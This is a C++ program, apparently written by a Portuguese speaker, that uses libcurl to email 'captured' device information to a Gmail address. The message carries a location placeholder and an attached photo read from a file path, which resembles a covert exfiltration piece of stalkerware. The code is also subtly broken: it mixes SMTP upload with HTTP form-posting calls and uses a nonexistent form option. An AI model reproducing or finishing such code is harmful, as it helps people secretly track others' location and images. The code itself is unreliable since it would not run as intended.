#include <curl/curl.h>
#include <sstream>
#include <string>

using namespace std;

struct upload_status {
    int lines_read;
};

size_t read_callback(void* ptr, size_t size, size_t nmemb, void* userp) {
    struct upload_status* upload_ctx = (struct upload_status*)userp;
    const char* data;

    if ((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
        return 0;
    }

    data = "From: seu-email@gmail.com\r\n"
           "To: destino@gmail.com\r\n"
           "Subject: Informações do dispositivo\r\n"
           "\r\n"
           "Segue as informações capturadas:\r\n"
           "Localização: <insira aqui a localização capturada>\r\n"
           "<img src='cid:foto'>\r\n";

    if (upload_ctx->lines_read >= 1) {
        return 0;
    }

    size_t len = strlen(data);
    memcpy(ptr, data, len);
    upload_ctx->lines_read++;

    return len;
}

int main() {
    CURL* curl;
    CURLcode res;
    struct curl_slist* recipients = NULL;
    struct upload_status upload_ctx;
    upload_ctx.lines_read = 0;

    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
        curl_easy_setopt(curl, CURLOPT_USERNAME, "seu-email@gmail.com");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "sua-senha");
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "seu-email@gmail.com");

        recipients = curl_slist_append(recipients, "destino@gmail.com");
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
        curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        struct curl_httppost* post = NULL;
        struct curl_httppost* last = NULL;

        curl_formadd(&post, &last,
                     CURLFORM_COPYNAME, "foto",
                     CURLFORM_FILE, "/caminho/para/foto.jpg",
                     CURLFORM_CONTENTID, "<foto>",
                     CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
        curl_formfree(post);
    }

    return 0;
}
